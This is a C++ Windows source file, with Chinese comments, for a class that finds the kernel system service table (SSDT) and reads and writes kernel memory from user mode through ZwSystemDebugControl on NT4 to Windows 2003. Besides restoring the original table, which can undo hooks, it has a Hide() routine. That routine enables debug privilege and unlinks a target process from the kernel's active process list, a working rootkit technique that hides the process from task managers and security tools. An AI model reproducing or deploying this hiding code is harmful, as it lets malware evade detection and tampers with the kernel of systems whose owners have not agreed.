#include "StdAfx.h"
#include "SsdtOper.h"
#include <tchar.h>
#include <stdlib.h>

using namespace SystemCommon;

CSsdtOper::CSsdtOper(void)
{
	RtlNtStatusToDosError    = NULL;
	ZwQuerySystemInformation = NULL;
	RtlInitUnicodeString = NULL;
	ZwOpenSection = NULL;
	NtOpenSection = NULL;
	ZwSystemDebugControl = NULL;

	m_hNtDLL = NULL; 

	m_hMutex = NULL;

	m_dwKiServiceTable = 0;
	m_dwKernelBase = 0;
	m_pListSSDT = NULL;
	m_dwServices = 0;

	m_pProcessInfo = NULL;

	m_bIsSupport = TRUE;
	OSVERSIONINFO tosvi = {sizeof(OSVERSIONINFO)};
	if(GetVersionEx(&tosvi))
	{
		if(tosvi.dwMajorVersion == 5)
		{
			if(tosvi.dwMinorVersion == 0)//win2k
			{
				m_dwAddressPosForward = 0xa0;
				m_dwAddressPosBackward = 0xa4;
			}
			else if(tosvi.dwMinorVersion == 1)//winxp
			{
				m_dwAddressPosForward = 0x88;
				m_dwAddressPosBackward = 0x8c;
			}
			else if(tosvi.dwMinorVersion == 2)//win2003
			{
				m_dwAddressPosForward = 0x8a;
				m_dwAddressPosBackward = 0x8e;
			}
			else m_bIsSupport = FALSE;
		}
		else if(tosvi.dwMajorVersion == 4 && tosvi.dwMinorVersion == 0 && tosvi.dwPlatformId == 2)//NT
		{
			m_dwAddressPosForward = 0x98;
			m_dwAddressPosBackward = 0x9c;
		}
		else m_bIsSupport = FALSE;
	}
	else
	{ 
		m_bIsSupport = FALSE;
	}
}

CSsdtOper::~CSsdtOper(void)
{
}


BOOL CSsdtOper::EnablePrivilege(LPCTSTR pPrivName, BOOL bEnable)
{
	BOOL bReturn = FALSE;
	HANDLE hToken = NULL;
	LUID uidName = {0};
	TOKEN_PRIVILEGES tpToken = {0};
	DWORD dwReturn = 0;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return bReturn;
	
	if (!LookupPrivilegeValue(NULL, pPrivName, &uidName))
	{
		CloseHandle(hToken);
		return bReturn;
	}
	
#ifndef SE_PRIVILEGE_REMOVED
#define SE_PRIVILEGE_REMOVED            (0X00000004L)
#endif
	
	tpToken.PrivilegeCount = 1;
	tpToken.Privileges[0].Luid = uidName;
	tpToken.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	
	bReturn = AdjustTokenPrivileges(hToken, FALSE, &tpToken, sizeof(TOKEN_PRIVILEGES), NULL, &dwReturn);
	
	CloseHandle(hToken);
	
	return bReturn;
	/*
	NTSTATUSEX RtlAdjustPrivilege
	(
	DWORD    Privilege,
	BOOLEAN Enable,
	BOOLEAN CurrentThread,
	PBOOLEAN Enabled
	)
	参数的含义：
	Privilege [In] Privilege index to change.                        
	// 所需要的权限名称，可以到 MSDN 查找关于 Process Token & Privilege 内容可以查到
	
	  Enable [In] If TRUE, then enable the privilege otherwise disable.
	  // 如果为True 就是打开相应权限，如果为False 则是关闭相应权限
	  
		CurrentThread [In] If TRUE, then enable in calling thread, otherwise process.
		// 如果为True 则仅提升当前线程权限，否则提升整个进程的权限
		
		  Enabled [Out] Whether privilege was previously enabled or disabled.
		  // 输出原来相应权限的状态（打开 | 关闭）
		  
			常量 SE_BACKUP_PRIVILEGE = 0x11h
			常量 SE_RESTORE_PRIVILEGE = 0x12h
			常量 SE_SHUTDOWN_PRIVILEGE = 0x13h
			常量 SE_DEBUG_PRIVILEGE = 0x14h
	*/
}

BOOL CSsdtOper::GetSSDT()
{
	HMODULE hKernel;
	PCHAR pKernelName;
	PDWORD pService;
	PIMAGE_FILE_HEADER pfh;
	PIMAGE_OPTIONAL_HEADER poh;
	PIMAGE_SECTION_HEADER psh;
	ULONG n;

	DWORD    dwKSDT;                // rva of KeServiceDescriptorTable
	DWORD    dwServices;

	BOOL bReturn = InitNTDLL();
	if(!bReturn)
	{ 
		OutputDebugStringA("InitNTDLL is error");
		//break;
	}
	// get system modules - ntoskrnl is always first there
	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &n);
	PULONG p = new ULONG[n];
	ZwQuerySystemInformation(SystemModuleInformation, p, n, &n);
	PSYSTEM_MODULE_INFORMATION module = PSYSTEM_MODULE_INFORMATION(p+1);

	// 镜像基址
	m_dwKernelBase = (DWORD)module->Base;
	// 文件名,它有可能会在boot.ini从命名
	pKernelName = module->ModuleNameOffset + module->ImageName;
	hKernel = LoadLibraryExA(pKernelName, 0, DONT_RESOLVE_DLL_REFERENCES);
	dwKSDT = (DWORD)GetProcAddress(hKernel, "KeServiceDescriptorTable");
	dwKSDT -= (DWORD)hKernel;
	// 找到KiServiceTable
	m_dwKiServiceTable = FindKiServiceTable(hKernel, dwKSDT);

	GetHeaders((PCHAR)hKernel, &pfh, &poh, &psh);
	//获得当前SSDT总数,赋值给dwServices.
	dwServices = 0;
	pService = (PDWORD)((DWORD)hKernel + m_dwKiServiceTable);
	while(*pService - poh->ImageBase < poh->SizeOfImage) 
	{
		pService++;
		dwServices++;
	}
	m_dwServices = dwServices;
	m_pListSSDT = new SSDT_LIST_ENTRY[m_dwServices];
	m_pdwTableOrg = new DWORD[m_dwServices];

	//	DWORD dwOldProtect = 0;
	//	VirtualProtect(FunAddr, 0x1000, PAGE_READWRITE, &dwOldProtect);
	dwServices = 0;
	pService = (PDWORD)((DWORD)hKernel + m_dwKiServiceTable);
	for(pService = (PDWORD)((DWORD)hKernel + m_dwKiServiceTable); 
		*pService - poh->ImageBase < poh->SizeOfImage;
		pService++, dwServices++)
	{
		m_pListSSDT[dwServices].Org = *pService - poh->ImageBase + m_dwKernelBase;
		m_pdwTableOrg[dwServices] = m_pListSSDT[dwServices].Org;
	}
	FreeLibrary(hKernel);

	FindExport();

	m_pdwTableNow = new DWORD[m_dwServices];
	bReturn = GetData(m_dwKernelBase + m_dwKiServiceTable, m_pdwTableNow, m_dwServices * sizeof(DWORD));
	if(!bReturn)
	{  
		//break;
	}
	for(int i = 0; i < (int)m_dwServices; i++)
		m_pListSSDT[i].Now = m_pdwTableNow[i];

	delete [] p;
	return TRUE;
}


BOOL CSsdtOper::InitNTDLL()
{
	m_hNtDLL = LoadLibrary(_T("ntdll.dll"));
	if(!m_hNtDLL)
		return FALSE;

	RtlNtStatusToDosError = (RTLNTSTATUSTODOSERROR)GetProcAddress(m_hNtDLL, "RtlNtStatusToDosError");
	RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress(m_hNtDLL, "RtlInitUnicodeString");
	ZwOpenSection = (ZWOPENSECTION)GetProcAddress(m_hNtDLL, "ZwOpenSection");
	NtOpenSection = (NTOPENSECTION)GetProcAddress(m_hNtDLL, "NtOpenSection");
	ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(m_hNtDLL, "ZwQuerySystemInformation");
	ZwSystemDebugControl = (ZWSYSTEMDEBUGCONTROL)GetProcAddress(m_hNtDLL, "ZwSystemDebugControl");

	return (RtlNtStatusToDosError != NULL && 
		RtlInitUnicodeString != NULL && 
		ZwOpenSection != NULL && 
		NtOpenSection != NULL && 
		ZwQuerySystemInformation != NULL && 
		ZwSystemDebugControl != NULL);
}


DWORD CSsdtOper::FindKiServiceTable(HMODULE hModule, DWORD dwKSDT)
{
	PIMAGE_FILE_HEADER			pfh;
	PIMAGE_OPTIONAL_HEADER		poh;
	PIMAGE_SECTION_HEADER		psh;
	PIMAGE_BASE_RELOCATION		pbr;
	PIMAGE_FIXUP_ENTRY			pfe;
	DWORD dwFixups = 0, i, dwPointerRva, dwPointsToRva, dwKiServiceTable;
	BOOL bFirstChunk;

	GetHeaders((PCHAR)hModule, &pfh, &poh, &psh);
	// loop thru relocs to speed up the search
	if((poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) &&
		(!((pfh->Characteristics) & IMAGE_FILE_RELOCS_STRIPPED)))
	{
		pbr = (PIMAGE_BASE_RELOCATION)RVATOVA(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress, hModule);

		bFirstChunk = TRUE;
		// 1st IMAGE_BASE_RELOCATION.VirtualAddress of ntoskrnl is 0
		while(bFirstChunk || pbr->VirtualAddress)
		{
			bFirstChunk = FALSE;

			pfe = (PIMAGE_FIXUP_ENTRY)((DWORD)pbr + sizeof(IMAGE_BASE_RELOCATION));

			for(i = 0; i < (pbr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))>>1; i++, pfe++)
			{
				if(pfe->type == IMAGE_REL_BASED_HIGHLOW)
				{
					dwFixups++;
					dwPointerRva = pbr->VirtualAddress + pfe->offset;
					// DONT_RESOLVE_DLL_REFERENCES flag means relocs aren't	fixed
					dwPointsToRva = *(PDWORD)((DWORD)hModule + dwPointerRva) - (DWORD)poh->ImageBase;

					// does this reloc point to KeServiceDescriptorTable.Base?
					if(dwPointsToRva == dwKSDT)
					{
						// check for mov [mem32],imm32. we are trying to find
						// "mov ds:_KeServiceDescriptorTable.Base, offset_KiServiceTable"
						// from the KiInitSystem.
						if(*(PWORD)((DWORD)hModule + dwPointerRva - 2) == 0x05c7)
						{
							// should check for a reloc presence on	KiServiceTable here
							// but forget it
							dwKiServiceTable = *(PDWORD)((DWORD)hModule + dwPointerRva + 4) - poh->ImageBase;
							return dwKiServiceTable;
						}
					}
				}
				// should never get here
			}
			*(PDWORD)&pbr += pbr->SizeOfBlock;
		}
	}

	return 0;
}

DWORD CSsdtOper::GetHeaders(PCHAR ibase, PIMAGE_FILE_HEADER *pfh, PIMAGE_OPTIONAL_HEADER *poh, PIMAGE_SECTION_HEADER *psh)
{
	PIMAGE_DOS_HEADER mzhead = (PIMAGE_DOS_HEADER)ibase;
	if((mzhead->e_magic != IMAGE_DOS_SIGNATURE) ||
		(*(PDWORD)&ibase[mzhead->e_lfanew] != IMAGE_NT_SIGNATURE))return FALSE;

	*pfh = (PIMAGE_FILE_HEADER)&ibase[mzhead->e_lfanew];
	if(((PIMAGE_NT_HEADERS)*pfh)->Signature != IMAGE_NT_SIGNATURE)return FALSE;

	*pfh = (PIMAGE_FILE_HEADER)((PBYTE)*pfh + sizeof(IMAGE_NT_SIGNATURE));
	*poh = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*pfh + sizeof(IMAGE_FILE_HEADER));
	if((*poh)->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)return FALSE;

	*psh = (PIMAGE_SECTION_HEADER)((PBYTE)*poh + sizeof(IMAGE_OPTIONAL_HEADER));
	return TRUE;
}


void CSsdtOper::FindExport()
{
	PIMAGE_FILE_HEADER			pfh;
	PIMAGE_OPTIONAL_HEADER		poh;
	PIMAGE_SECTION_HEADER		psh;
	PIMAGE_EXPORT_DIRECTORY		ped;
	DWORD * arrayOfFunctionNames;
	DWORD * arrayOfFunctionAddresses;
	WORD * arrayOfFunctionOrdinals;
	DWORD functionOrdinal, functionAddress;

	HMODULE hNtdll = GetModuleHandle(_T("ntdll.dll"));
	GetHeaders((PCHAR)hNtdll, &pfh, &poh, &psh);

	if(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
	{
		ped = (PIMAGE_EXPORT_DIRECTORY)(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (BYTE*)hNtdll);
		arrayOfFunctionNames = (DWORD*)(ped->AddressOfNames + (BYTE*)hNtdll);
		arrayOfFunctionAddresses = (DWORD*)((BYTE*)hNtdll + ped->AddressOfFunctions);
		arrayOfFunctionNames = (DWORD*)((BYTE*)hNtdll + ped->AddressOfNames);
		arrayOfFunctionOrdinals = (WORD*)((BYTE*)hNtdll + ped->AddressOfNameOrdinals);

		for(int i = 0; i < (int)(ped->NumberOfNames); i++)
		{
			char* fun_name = (char*)((BYTE*)hNtdll + arrayOfFunctionNames[i]);
			functionOrdinal = arrayOfFunctionOrdinals[i] + ped->Base - 1;
			functionAddress = (DWORD)((BYTE*)hNtdll + arrayOfFunctionAddresses[functionOrdinal]);
			if(fun_name[0] == _T('N') && fun_name[1] == _T('t'))
			{
				WORD number = *((WORD*)(functionAddress+1));
				if(number > ped->NumberOfNames)continue;
				strncpy(m_pListSSDT[number].fname,fun_name,63);
			}
		}
	}
}

BOOL CSsdtOper::GetData(DWORD dwAddress, PVOID pData, DWORD dwLength)
{
	return OperateData(SysDbgCopyMemoryChunks_0, dwAddress, pData, dwLength);
}


BOOL CSsdtOper::OperateData(SYSDBG_COMMAND eCmd, DWORD dwAddress, PVOID pData, DWORD dwLength)
{
	NTSTATUSEX ntStatus = 0;
	MEMORY_CHUNKS tQueryBuffer = {0};
	DWORD dwReturnLength = 0;

	tQueryBuffer.Address = dwAddress;
	tQueryBuffer.Data = pData;
	tQueryBuffer.Length = dwLength;
	dwReturnLength = 0;

	ntStatus = ZwSystemDebugControl(eCmd, &tQueryBuffer, sizeof(MEMORY_CHUNKS), NULL, 0, &dwReturnLength);
 
	return ntStatus>=0 && dwReturnLength == dwLength;
}

BOOL CSsdtOper::ResumeSSDT()
{
	if(!m_dwKiServiceTable || !m_dwKernelBase)return FALSE;
	return SetData(m_dwKiServiceTable + m_dwKernelBase, m_pdwTableNow, m_dwServices * sizeof(DWORD));
} 

BOOL CSsdtOper::SetData(DWORD dwAddress, PVOID pData, DWORD dwLength)
{
	return OperateData(SysDbgCopyMemoryChunks_1, dwAddress, pData, dwLength);
}

BOOL CSsdtOper::CleanSSDT()
{
	if(!m_dwKiServiceTable || !m_dwKernelBase)return FALSE;
	return SetData(m_dwKiServiceTable + m_dwKernelBase, m_pdwTableOrg, m_dwServices * sizeof(DWORD));
} 


BOOL CSsdtOper::GetEprocessFromPid(DWORD dwProcessId)
{
	NTSTATUSEX	ntStatus;
	PVOID	pBuffer   = NULL;
	DWORD	dwBufferSize  = 4096;
	DWORD	dwHandles = 0;
	int	i = 0;
	PSYSTEM_HANDLE_INFORMATION	ptSystemHandleInformation = NULL;
	HANDLE hProcess = NULL;
	
	do 
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);//打开自身句柄,这样才能在handle列表中找到自己,PROCESS 对应 ObjectTypeNum 为5
		if(!hProcess)break;
		
		pBuffer = malloc(dwBufferSize);
		if(!pBuffer)break;
		ntStatus = ZwQuerySystemInformation(SystemHandleInformation, pBuffer, dwBufferSize, &dwBufferSize);
		if(0xC0000004L != ntStatus)break;
		free(pBuffer);
		pBuffer = NULL;
		pBuffer = malloc(dwBufferSize);
		if(!pBuffer)break;
		
		ntStatus = ZwQuerySystemInformation(SystemHandleInformation, pBuffer, dwBufferSize, NULL);
		if(ntStatus<0)break;
		
		dwHandles = *(PDWORD)pBuffer;//返回到缓冲区的首先是一个DWORD类型的数据,表示有多少数组
		ptSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)((DWORD)pBuffer + 4);
		
		for(i = dwHandles - 1; i >= 0; i--)
		{
			if(ptSystemHandleInformation[i].Handle == (USHORT)hProcess)
			{
				if(ptSystemHandleInformation[i].ObjectTypeNumber == 5)
				{
					memcpy(&m_tSystemHandleInformation, &ptSystemHandleInformation[i], sizeof(_SYSTEM_HANDLE_INFORMATION));
				 	break;
				}
			}
		}
	} while (FALSE);
	
	if(pBuffer)free(pBuffer);
	if(hProcess)CloseHandle(hProcess);
	
	return (i >= 0);
}

BOOL CSsdtOper::Hide(DWORD dwProcessID)
{
	BOOL bReturn = FALSE;
	
	if(!m_bIsSupport)
		return bReturn;
  
	bReturn = EnablePrivilege(SE_DEBUG_NAME,TRUE);//SE_DEBUG_NAME,SE_SECURITY_NAME
 	
	do 
	{
		bReturn = InitNTDLL();
		if(!bReturn)
		{
		 	break;
		}
		
		bReturn = GetEprocessFromPid(dwProcessID);
		if(!bReturn)
		{
		 	break;
		}
		
		bReturn = GetData((DWORD)m_tSystemHandleInformation.Object + m_dwAddressPosForward, &m_dwDataForward, sizeof(DWORD));
		if(!bReturn)
		{
		 	break;
		}
		
		bReturn = GetData((DWORD)m_tSystemHandleInformation.Object + m_dwAddressPosBackward, &m_dwDataBackward, sizeof(DWORD));
		if(!bReturn)
		{
			break;
		}
		
	 	
		bReturn = SetData(m_dwDataForward + 4, &m_dwDataBackward, sizeof(DWORD));
		if(!bReturn)
		{
			 break;
		}
		
		bReturn = SetData(m_dwDataBackward, &m_dwDataForward, sizeof(DWORD));
		if(!bReturn)
		{
		 	break;
		}
		
		bReturn = SetData((DWORD)m_tSystemHandleInformation.Object + m_dwAddressPosForward, &m_tSystemHandleInformation.Object, sizeof(DWORD));
		if(!bReturn)
		{
		 	break;
		}
		
		bReturn = SetData((DWORD)m_tSystemHandleInformation.Object + m_dwAddressPosBackward, &m_tSystemHandleInformation.Object, sizeof(DWORD));
		if(!bReturn)
		{
			break;
		}
	} while (FALSE);
	
	CloseNTDLL();
	
	return bReturn;
}

void CSsdtOper::CloseNTDLL()
{
	if(m_hNtDLL != NULL)
	{
		FreeLibrary(m_hNtDLL);
		m_hNtDLL = NULL;
	}
}